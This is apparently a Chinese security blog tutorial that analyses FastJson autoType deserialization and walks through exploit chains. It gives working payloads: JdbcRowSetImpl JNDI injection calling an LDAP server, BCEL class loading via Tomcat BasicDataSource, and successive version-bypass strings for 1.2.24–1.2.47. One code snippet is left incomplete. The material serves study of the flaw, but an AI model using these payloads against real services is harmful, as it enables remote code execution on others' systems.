
Java 反序列化之 FastJson 反序列化及绕过



# Java 反序列化之 FastJson 反序列化及绕过

先抛出一个问题，一个 Json 解析的功能库，为什么能够代码执行呢

## FastJson 解析方式：

### JSON 形式解析字符串：

我们先来看一下 FastJson 的正常解析的使用方法，这里我们可以看到我们将字符串 s 进行解析然后输出，是以 JSON 形式进行的输出

```bash
package FastJson;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

public class JSONUnser {
    public static void  main(String[] args) throws Exception{
        String s = "{\"param1\":\"aaa\",\"param2\":\"bbb\"}";
        JSONObject jsonObject = JSON.parseObject(s);
        System.out.println(jsonObject);
        System.out.println(jsonObject.getString("param1"));
    }
}
//{"param1":"aaa","param2":"bbb"}
//aaa
```

### 指定解析类型解析为对象：

如果我们让他解析的形式是在类中进行解析，令字符串解析成一个 Person 对象，我们就得到下面对应的结果

```bash
package FastJson;

public class Person {
    private String name;
    private int age;

    public Person(String name, int age){this.name = name;this.age = age;}

    public Person(){System.out.println("constructor");}

    public String getName() {System.out.println("getName");return this.name;}

    public void setName(String name) {System.out.println("setName");this.name = name;}

    public int getAge() {System.out.println("getAge");return this.age;}

    public void setAge(int age) { System.out.println("setAge");this.age = age;}
}
```

```bash
package FastJson;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;


public class JSONUnser {
    public static void  main(String[] args) throws Exception{
//        String s = "{\"param1\":\"aaa\",\"param2\":\"bbb\"}";
        String s = "{\"age\":18,\"name\":\"abc\"}";

        Person person = JSON.parseObject(s,Person.class);

        System.out.println(person.getName());
    }
}
/*
constructor
setAge
setName
getName
abc
*/
```

### 根据字符串反序列化任意类：

*   上面是通过操作对应类，从而在类中进行字符串 JSON 解析生成对象，那如果字符串中前面加了@type，我们可以发现，@type 对应的键值是可以直接解析指定的类的，我们可以发现通过传入不同的字符，可以执行不同的代码，这里就相当危险了。
*   至于为什么要引入这个 type，我们这里举一个不是很恰当的例子：
*   现在有材料的衣服，一种是布料，一种是速干料，但是两种衣服外表是一样的，在生产过程的标签中（序列化过程），如果不加衣服的材料，在出厂反序列化的过程就会分不清，这样的话就会产生歧义，而如果加上材料，就相当于加上了@type 这样的话，我们就可以分清楚衣服的材料对应哪一个衣服，但是又因为@type 客户端可控，速干料的衣服就可以被贴上布料的标签，然后以便宜的价格去买到。

```bash
package fastjson;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;


public class JSONUnser {
    public static void  main(String[] args) throws Exception{
/*
        String s = "{\"param1\":\"aaa\",\"param2\":\"bbb\"}";
        String s = "{\"age\":18,\"name\":\"abc\"}";
*/
        String s = "{\"@type\":\"fastjson.Person\",\"age\":18,\"name\":\"abc\"}";

        JSONObject jsonObject = JSON.parseObject(s);

        System.out.println(jsonObject);
    }
}
constructor
setAge
setName
getAge
getName
{"name":"abc","age":18}
```

上面我们就可以发现，通过解析字符串，最后竟然对 Person 里面的类进行了解析实例化赋值调用操作，赋值要不就是反射赋值，要不就是 set 函数去改，我们可以发现这里是通过调用 Person 里面的 set 函数去进行的赋值。下面我们就来代码调试一下看看这里赋值的逻辑是什么样的。

## 调用流程简单分析：

*   我们在处理字符串的方法`JSON.parseObject`的地方下一个端点：

[![](assets/1701612260-d6cf081567dabab8b661908c20350487.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723225412-c9152b38-2968-1.png)

*   我们看到最后他转了一个 JSONObject：它其实对应的就是一个 Map，然后我们跟进 parse 方法：

[![](assets/1701612260-2c5ca4da963502b073735f0f64d005c8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723225417-cbfe5e50-2968-1.png)

[![](assets/1701612260-7bfbe53fa5438705249c4256b1ac6441.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723225424-d0a437e0-2968-1.png)

*   这里我们可以看到使用了 DefaultJSONParser，这里其实就是对传入的字符串进行解析，一般都使用 DefaultJSONParser 进行解析，然后我们再跟进下面的 parse 进入核心的逻辑，调试的东西太多了，这里就主要讲一讲逻辑吧，在解析的过程中，可以分为两个阶段，一个是对字符串形式的判断，是否为 json 形式，一个是对 key 和 value 的获取，先获取 key 的值，再获取 value 的值。
*   这里我们关注一点，就是获取 key 以后，我们获取的应该是@type，会做一个特殊的调整，表示应该做 java 反序列化还是单纯的 json 反序列化，这里匹配到@type，所以后续要 Java 反序列化：

[![](assets/1701612260-c5fd51575a9f31f67576660013334e17.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723225433-d5e98872-2968-1.png)

*   我们可以看到对类进行了 loadClass 加载，然后后面我们就要按照 Java 的逻辑来进行反序列化操作，这里第一步就是获取了反序列化器，然后用反序列化器进行反序列化操作：

[![](assets/1701612260-81687da6015f028b7b80d19368869590.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723230931-eccb29a4-296a-1.png)

*   然后我们就来跟进一下是如何进行反序列化的，重点来关注一下里面的代码，最后会通过 JavaBean 来解析类

[![](assets/1701612260-bf9e25e4e70363659976788664114c26.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723225507-ea1b5e88-2968-1.png)

*   在创建类的反序列化器的时候，需要把类里面的东西进行了解，这里就通过 build 函数，我们再来看一下 build 函数：

[![](assets/1701612260-b03b8ff5f33d3b3a54805e04783fc9d9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723225515-eeb2d96c-2968-1.png)

*   在 build 整体逻辑中，先遍历了一遍 method（set），然后遍历了一遍 public fields，然后又遍历了一遍 method（get），其中 get 条件是：

[![](assets/1701612260-3a74666aff78ff526c1f45ab98c081be.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723225522-f2b7ce46-2968-1.png)

[![](assets/1701612260-2956298280d046148da8fe5a18f10a1a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723225536-fb828f3e-2968-1.png)

……后面跟的很乱，就不在这里写了，具体后面要用到的基本上已经提到了……

## FastJson 漏洞链特点：

根据上文的分析，在反序列化时，parse 触发了 set 方法，parseObject 同时触发了 set 和 get 方法，由于存在这种`autoType`特性。如果`@type`标识的类中的 setter 或 getter 方法存在恶意代码，那么就有可能存在 fastjson 反序列化漏洞。

首先我们先来总结一下 FastJson 反序列化和原生反序列化利用不同的点：

*   **FastJson 不需要实现 Serializable**
    
*   **不需要变量不是 transient/可控变量：**
    
    1.  变量有对应的 setter
        
    2.  或是 public/static
        
    3.  或满足条件的 getter(返回值是)：
        

[![](assets/1701612260-e721f698fee9fee33ea0cc516672b9ed.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723225652-28dc968c-2969-1.png)

*   **反序列化入口点不是 readObject，而是 setter 或者是 getter**
    
*   **执行点是相同的：反射或者类加载**
    

## FastJson<1.2.24:

### JdbcRowSetImpl 类+JNDI 注入（出网）：

#### 调用链

*   我们首先找到了漏洞的利用点是一个`JNDI`注入：

[![](assets/1701612260-542e741f8c958620dc3c364be9d42afe.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723225950-92b81dce-2969-1.png)

*   然后我们要看一下`getDataSourceName`下面的参数可不可控，可以看到存在 setter 方法，所以可控：

[![](assets/1701612260-55a68703a5fc25a213368fc49f8180df.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723230020-a4a147e0-2969-1.png)

*   这里我们就要找一下对应的 setter 或者是符合条件的 getter 方法能够调用 connect 的方法：这里我们找到了三种，因为我们要用 get 或者是 set 方法，但是这里的 get 并不能满足我们上面所说的要求，所以这里我们选择 setter 方法：

[![](assets/1701612260-0fbd17af2ae6ac8a1643dc9fa5681d6b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723230047-b48325de-2969-1.png)

[![](assets/1701612260-998696022ddb6518147d740b6cb2dbee.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723230054-b8dc871a-2969-1.png)

#### EXP:

*   我们生成一下 jndi 注入的 payload 然后导入：

[![](assets/1701612260-04d7d043f01a4c0baff9e0161058a123.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723230103-be4be006-2969-1.png)

```bash
package EXP;

import com.alibaba.fastjson.JSON;

public class FastJsonJdbcRowSetlmpl {
    public static void main(String[] args) throws Exception{


//@type 调用 com.sun.rowset.JdbcRowSetImpl 类里面的 setter 触发 connet,connect 触发 JNDI 注入


// 第二个键对传入变量名
        /*
            public void setDataSourceName(String name) throws SQLException {
        */
// 第二个值对应 JNDI 注入的链接


// 第三个值对应调用 connect 方法的 setAutoCommit
        /*
            public void setAutoCommit(boolean var1) throws SQLException {
        */
// 第三个值传入一个布尔值


        String s = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"DataSourceName\":\"ldap://127.0.0.1:8085/rNMfFuPI\",\"AutoCommit\":\"false\"}";

        JSON.parseObject(s);
    }
}
```

#### 限制：

版本限制，依赖限制，出网（JNDI 外联）

### FastJsonBcel 类 + 动态类加载（不出网）：

#### 调用链：

我们在 jdk 的内置类中找到了这样一方法，能够进行动态类加载，就是 ClassLoader 里面的 loadClass 方法，在里面调用了 defineClass：

[![](assets/1701612260-1efa2d0212e378142c28552c36e0e840.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723230155-dd150508-2969-1.png)

我们先来看一下如何使用这里的动态类加载来加载任意类：

我们想要调 defineClass，就要保证 clazz 不为 null，然后我们就要调前面的`createClass`方法，然后里面调用了`decode`方法返回了 clazz 值，所以我们在编写 exp 的时候就需要先进行一个`encode`：

[![](assets/1701612260-2c5440b20a08ec2fa925b885816c06ad.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723230203-e210d758-2969-1.png)

```bash
package EXPFastJson;

import java.io.*;
import com.alibaba.fastjson.JSON;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;

public class FastJsonBcel {
    public static void main(String[] args) throws Exception{
        ClassLoader classLoader = new ClassLoader();
        byte[] bytes = convert("D:\\Tomcat\\CC\\target\\classes\\EXP\\Demo.class");
        String code = Utility.encode(bytes,true);
        //使用 BCEL 方式动态加载一下
        classLoader.loadClass("$$BCEL$$"+code).newInstance();


    private static byte[] convert(String s) throws Exception{
    }
}
```

然后下面我们就需要考虑如何调用 loadClass 方法，在 tomcat 包下面找到了一个 BasicDataSource 的类，里面调用了 forName 方法，这里 forName 方法的底层逻辑其实调用了 loadClass 方法，所以如果我们让 dirverClassLoader 等于 ClassLoader，让 dirverClassName 等于我们自己的恶意类，就可以执行。

[![](assets/1701612260-dedd0e9cbb111ebd084201813745753b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723230235-f50c7d76-2969-1.png)

然后恰好这两个变量还能够通过 setter 方法进行可控：

[![](assets/1701612260-c5aeb816210d877246f02163c169c2eb.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723230241-f8f13cba-2969-1.png)

然后我们就来看最后能不能调用到某个 setter 方法或者 getter 中，看哪里能够调用 forName 方法对应的 createConnectionFactory 方法：

[![](assets/1701612260-0d65fb122761029e2230e726446d7dde.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723230247-fc3b3fd8-2969-1.png)

再寻找 createDataSource 方法：

[![](assets/1701612260-424e7d6fa13c1618715926a745eb763f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723230300-0412714a-296a-1.png)

最后我们就找到了 getConnetion 这个方法，所以单纯的调用流程就是下面这个样子，我们再把他转换为 JSON 的形式

```bash
package EXPFastJson;

import java.io.*;
import com.alibaba.fastjson.JSON;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;
import org.apache.tomcat.dbcp.dbcp2.BasicDataSource;

public class FastJsonBcel {
    public static void main(String[] args) throws Exception{
        ClassLoader classLoader = new ClassLoader();
        byte[] bytes = convert("D:\\Tomcat\\CC\\target\\classes\\EXP\\Demo.class");
        String code = Utility.encode(bytes,true);
//        classLoader.loadClass("$$BCEL$$"+code).newInstance();


        BasicDataSource basicDataSource = new BasicDataSource();
        basicDataSource.setDriverClassLoader(classLoader);
        basicDataSource.setDriverClassName("$$BCEL$$"+code);
        basicDataSource.getConnection();
//        JSON.parseObject(s);
    }

    private static byte[] convert(String filePath) throws IOException {
        File file = new File(filePath);

        // 检查文件是否存在
        if (!file.exists()) {
            throw new FileNotFoundException("文件未找到：" + filePath);
        }

        // 将文件内容读取到字节数组中
        try (InputStream inputStream = new FileInputStream(file)) {
            ByteArrayOutputStream byteOutput = new ByteArrayOutputStream();
            byte[] buffer = new byte[4096];
            int bytesRead;

            while ((bytesRead = inputStream.read(buffer)) != -1) {
                byteOutput.write(buffer, 0, bytesRead);
            }

            return byteOutput.toByteArray();
        }
    }
}
```

#### EXP：

```bash
package EXPFastJson;

import java.io.*;
import com.alibaba.fastjson.JSON;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;
import org.apache.tomcat.dbcp.dbcp2.BasicDataSource;

public class FastJsonBcel {
    public static void main(String[] args) throws Exception{
        ClassLoader classLoader = new ClassLoader();
        byte[] bytes = convert("D:\\Tomcat\\CC\\target\\classes\\EXPFastJson\\Demo.class");
        String code = Utility.encode(bytes,true);
//        classLoader.loadClass("$$BCEL$$"+code).newInstance();


//        BasicDataSource basicDataSource = new BasicDataSource();
//        basicDataSource.setDriverClassLoader(classLoader);
//        basicDataSource.setDriverClassName("$$BCEL$$"+code);
//        basicDataSource.getConnection();

        String s = "{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"DriverClassName\":\"$$BCEL$$"+ code +"\",\"DriverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}}";

//      parseObject 是先 parse 后 toJSON，这样我们才能调用 get 方法：getConnection()
        JSON.parseObject(s);
    }

    private static byte[] convert(String filePath) throws IOException {
        File file = new File(filePath);
        // 检查文件是否存在
        if (!file.exists()) {
            throw new FileNotFoundException("文件未找到：" + filePath);
        }
        // 将文件内容读取到字节数组中
        try (InputStream inputStream = new FileInputStream(file)) {
            ByteArrayOutputStream byteOutput = new ByteArrayOutputStream();
            byte[] buffer = new byte[4096];
            int bytesRead;

            while ((bytesRead = inputStream.read(buffer)) != -1) {
                byteOutput.write(buffer, 0, bytesRead);
            }

            return byteOutput.toByteArray();
        }
    }
}
```

## FastJson<=1.2.47 绕过：

### 漏洞修复：

我们可以发现在 1.2.25 中，对`@type`进行了修复，检测了是否能够进行`AutoType`，而 1.2.24 在这里是直接进行`loadClass`，所以我们就要对这里进行一个绕过，跟进一下这个函数：

[![](assets/1701612260-d97184f4393dde0a2e4a740372fae233.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723230318-0ee8b8c2-296a-1.png)

### checkAutoType 检测流程：

然后我们使用流程图来理解一下里面这个函数里面的逻辑，看看什么时候来进行类的加载：

[![](assets/1701612260-65990be1d80ff7e42146917777b2c174.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723230324-12283792-296a-1.png)

*   在第一个中，因为在白名单中才能够进行缓存，所以这里不符合要求，第三个同理
*   在第二个返回类当中，期望类为空且类与期望类一致的时候返回类，这里我们的期望类为空，所以这里能够符合条件，所以我们在往上找，只要缓存中存在类，我们就能够进行加载。
*   第四个是基于期望类的，因为这里和期望类并无关所以也满足不了
*   进入 false 来到第五个，又因为默认情况下 AutoType 为 false，所以也加载不了

### 调用链：

所以能够有可能返回类的只有第二个，我们就来看一下如何在缓存中找到我们想要加载的类：

[![](assets/1701612260-1002002df5a0537acf2bbc85c001de3f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723230337-1a14d15e-296a-1.png)

我们跟进 getClassFromMapping 方法中，从里面找 mapping 里面的缓存，然后在 loadClass 中我们可以发现是有可能对类进行控制的，其他地方都是指定了一些基础类进行的缓存，而 loadClass 这里只要我们加载类成功以后，他就会放入缓存中，下次调用直接从缓存中进行加载，这里我们就要想怎么才能够在 loadClass 的时候将我们的类加载入缓存当中：

[![](assets/1701612260-cc9a4a55cb825f331ca2cb529307cd3c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723230445-427942ec-296a-1.png)

根据图片里面的调用点我们最后确定了 MiscCodec 里面的 deserialize 函数中，当 clazz==Class.class 的时候会进行调用，然后我们来观察 MiscCodec 可以发现，他继承了反序列化和序列化的接口，在 fastJson 的反序列化中也会把他当作反序列化器来进行调用：

[![](assets/1701612260-e1e0beebd51e7f767c4c1b58f1035f44.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723230458-4a7e5a2c-296a-1.png)

所以如果 FastJson 反序列化的类是属于 Class.class 的时候，就会调用 MiscCodec 反序列化器，然后调用 loadClass，传入我们想传入的字符串 strVal，然后在 loadClass 中作为 String className 进行加载并放在缓存里面。

[![](assets/1701612260-ed47ef3623c3917dec0a5429e2642af9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723230507-4f8b3c6a-296a-1.png)

具体赋值我们可以看这个位置：我们可以看到这里的`parser`对应的就是后面的`lexer.stringVal`比较，必须满足是 val 才能够不抛出异常，所以我们就让 string=val 就可以，然后后面我们对应反序列化的内容为恶意类就可以

[![](assets/1701612260-184009df5feb5d427595ddf891edd1fd.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723230513-530ea02a-296a-1.png)

[![](assets/1701612260-fb73b8faab926e666b70ac6cba784a37.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723230516-5549919c-296a-1.png)

### EXP：

```bash
package EXPFastJson;

import com.alibaba.fastjson.JSON;

public class FastJsonBypass1247 {
    public static void main(String[] args){
        //第一步：反序列化一个 Class 类，值为恶意类
        //用之前 payload 从缓存中继续加载
        String s = "{{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"DataSourceName\":\"ldap://127.0.0.1:8085/cgQuBZlq\",\"AutoCommit\":\"false\"}}";
        JSON.parseObject(s);
    }
}
```

### 调试：

我们第一步是加载 Class 类，可以看到在缓存当中找到了，然后最后返回了 Class 类：

[![](assets/1701612260-b541436dab2a46a1b290f6f8a00b91b6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723230524-59d6854e-296a-1.png)

第二步我们就查到了对应的反序列化器是 MiscCodec，然后调到 MiscCodec 类下的 deserialze 函数：

[![](assets/1701612260-e9783c9374bb973f9852cb25fc9af55e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723230529-5cb9e102-296a-1.png)

然后在这里判断 lexer.stringVal() 里面是否存在 val，不存在就抛出异常

[![](assets/1701612260-3da75c4237739830ae9725367712b5a1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723230534-5fcdb328-296a-1.png)

然后将我们的恶意类放入 strVal 里面进行 loadClass 加载，这里我们也可以发现在开启 AutoTyoe 的时候也存在绕过黑名单的一个形式：

[![](assets/1701612260-95e3c180c35fe160ac68ae9759d301d0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723230540-6312c8ca-296a-1.png)

所以这样的话 mapping 就有了我们加载的恶意类，然后在调用之前的恶意类我们就能够直接进行加载了。

## FastJson1.2.25-1.2.41 绕过：

我们上面提到了在缓存中获取类的下面有两个判断，也就是说在我们开启 AutoType 的情况下可以用下面两种方式来进行绕过：

*   如果以`[`开头则去掉`[`后进行类加载（在之前 Fastjson 已经判断过是否为数组了，实际走不到这一步）
*   如果以`L`开头，以`;`结尾，则去掉开头和结尾进行类加载

所以我们用下面这个就可以绕过黑名单进行加载，开启 AutoType：

```bash
import com.alibaba.fastjson.parser.ParserConfig;
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
```

```bash
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","DataSourceName":"ldap://127.0.0.1:8085/rNMfFuPI","AutoCommit":"false"}
```

```bash
package EXPFastJson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class FastJsonBypass1247 {
    public static void main(String[] args){
        //第一步：反序列化一个 Class 类，值为恶意类
        //用之前 payload 从缓存中继续加载
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

//        String s="{{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"DataSourceName\":\"ldap://127.0.0.1:8085/hFtNevZa\",\"AutoCommit\":false}}";
        String s="{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"DataSourceName\":\"ldap://127.0.0.1:8085/hFtNevZa\",\"AutoCommit\":1}";
        JSON.parseObject(s);
    }
}
```

## FastJson1.2.42 绕过：

1.2.42 相较于之前的版本，关键是在`ParserConfig.java`中修改了 1.2.41 前的代码

*   对于传入的类名，删除开头`L`和结尾的`;`

但是可以发现在以上的处理中，只删除了一次开头的`L`和结尾的`;`，双写可以绕过。

```bash
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","DataSourceName":"ldap://127.0.0.1:8085/hFtNevZa","AutoCommit":1}
```

## FastJson1.4.43 绕过：

1.2.43 版本修改了`checkAutoType()`的部分代码，对于 LL 等开头结尾的字符串抛出异常，这里我们就可以用`[`和`{`进行绕过：

```bash
{"@type":"[com.sun.rowset.JdbcRowSetImpl","DataSourceName":"ldap://127.0.0.1:8085/hFtNevZa","AutoCommit":1}
```

[![](assets/1701612260-f9a825ae2fde8ad08979184f7e13b35b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723230552-6a7b137e-296a-1.png)

看到报错提示，期待出现\[，但是出现了两个逗号，所以我们在后面再加一个\[：

[![](assets/1701612260-f46a174b930e6ee20750f2026652b813.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723230558-6e4bfa86-296a-1.png)

然后我们再按他说的在后面再加一个{：

[![](assets/1701612260-63972b7bc75c67742dc7b5101c3b58a4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20230723230604-71713f28-296a-1.png)

成功执行。

FastJson 的版本绕过除了 1.2.47 之外，还有两个版本的绕过，这次就先了解到这里，后面一段时间去学取证，等有空回来再继续啃 Java。

参考文章：  
[https://boogipop.com/2023/03/02/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/](https://boogipop.com/2023/03/02/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)  
[https://goodapple.top/archives/832](https://goodapple.top/archives/832)
